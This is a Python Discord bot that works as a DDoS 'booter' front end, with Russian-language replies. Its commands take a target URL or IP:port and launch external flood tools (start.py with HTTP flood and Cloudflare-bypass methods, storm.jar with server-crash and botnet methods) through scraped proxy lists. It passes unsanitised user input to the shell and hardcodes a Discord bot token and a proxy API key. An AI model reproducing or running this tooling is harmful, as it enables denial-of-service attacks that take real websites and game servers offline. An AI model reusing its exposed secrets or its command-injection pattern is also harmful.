import asyncio
import discord
from discord.ext import commands
from subprocess import Popen
from os import system
from time import sleep
from random import randint

proxyMode = input('ProxyMode (s, u): ')

def update():
    system('rm proxies.txt')
    system(
        'curl -o proxies-0.txt "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"')
    system('curl -o proxies-1.txt "https://cdn.discordapp.com/attachments/935122416735236126/991426571766341662/proxies_2.txt"')
    system('curl -o proxies-2.txt "https://cdn.discordapp.com/attachments/935122416735236126/991426595359313940/proxies.txt"')
    system(
        'curl -o proxies-3.txt "https://proxoid.net/api/getProxy?key=31d5cee9c01062ea57a3a3ea2395c318&countries=all&types=socks4,socks5&level=all&speed=0&count=0"')
    f = open('proxies.txt', 'w+')
    f1 = open('proxies-0.txt', 'r')
    f2 = open('proxies-1.txt', 'r')
    f3 = open('proxies-2.txt', 'r')
    f4 = open('proxies-3.txt', 'r')
    f.write(f1.read() + f2.read() + f3.read() + f4.read())
    f.close()
    print('Proxy Updated')


if proxyMode == 's':
    pass
elif proxyMode == 'u':
    update()

def cpuCoreSelect():
	rc = randint(0, 9)
	return 'taskset -a -c {}'.format(rc)

client = commands.Bot(command_prefix='$', help_command=None)
methods_all = ['join',
               'legitjoin',
               'localhost',
               'invaldnames',
               'longnames',
               'power',
               'spoof',
               'spam',
               'killer',
               'nullping',
               'charonbot',
               'packet',
               'queue',
               'sf',
               'ultimatesmasher',
               'nabcry',
               'colorcrasher',
               'yoonikscry',
               'nettydowner',
               'bigpacket',
               'network',
               'bighandshake',
               'randombytes',
               'botjoiner',
               'ping',
               'multikiller',
               'extremejoin',
               'spamjoin',
               'ram',
               'botnet']
web_role = 991599142730219611
wmeth_list = ['STRESS', 'POST', 'CFB', 'GET', 'BYPASS', 'BOT', 'HEAD', 'DYN', 'CFBUAM', 'EVEN', 'NULL', 'COOKIE',
              'SLOW', 'DOWNLOADER', 'XMLRPC', 'KILLER', 'STOMP']
async def proxy_nmsg():
    async def on_ready():
        await asyncio.sleep(300)
        if proxyMode == 's':
            pass
        elif proxyMode == 'u':
            update()
@client.command(name='wmeth')
async def wmeth(ctx):
    embed = discord.Embed(title=":file_folder: [Methods]",
                          description='[\'STRESS\',\'POST\',\'CFB\',\'GET\',\'BYPASS\',\'BOT\', \'HEAD\',\'DYN\',\'EVEN\',\'NULL\',\'COOKIE\',\'SLOW\',\'DOWNLOADER\',\'XMLRPC\',\'KILLER\',\'STOMP\',,\'CFBUAM\']\nПисать капсом!')
    #(embed=embed)
@commands.has_role(web_role)
@client.command(name='web')
async def web_(ctx, url, method, time):
    await proxy_nmsg()
    if ctx.channel.id == 990945754245902366:
        if method in wmeth_list:
            if int(time) < 90:
                embed = discord.Embed(title='[Атака отправлена успешно]', description='',
                                      color=discord.Color(0x2F3136))
                embed.add_field(name='[URL]', value=f'{url}')
                embed.add_field(name='[Method]', value=f'{method}')
                embed.add_field(name='[Time]', value=f'{time}')
                Popen(f'timeout {time}s python3 start.py {method} {url} 0 8000 proxies.txt 61 {time}',
                                 shell=True)
                #(embed=embed)
@client.command(name='attack')
async def att_(ctx, ipport, prot, meth, time, cps,):
    if ctx.channel.id == 990945754245902366:
        if meth in methods_all:
            if int(time) < 46:
                await proxy_nmsg()
                sleep(1)
                embed=discord.Embed(title='NCCorp')
                embed.add_field(name='IP:Port', value=f'{ipport}')
                embed.add_field(name='Protocol', value=f'{prot}')
                embed.add_field(name='Method', value=f'{meth}')
                embed.add_field(name='Time', value=f'{time}')
                embed.add_field(name='CPS', value=f'{cps}')
                Popen(f'{cpuCoreSelect()} java -Xmx4G -jar storm.jar {ipport} {prot} {meth} {time} {cps}', shell=True)
                #(embed=embed)

client.run("OTkwOTc0NzAwODkxMDEzMjAx.GWHdk-.AT8tEE1a0JDddHiN_tUiDQDMpzcE9rz_hcaT8E")
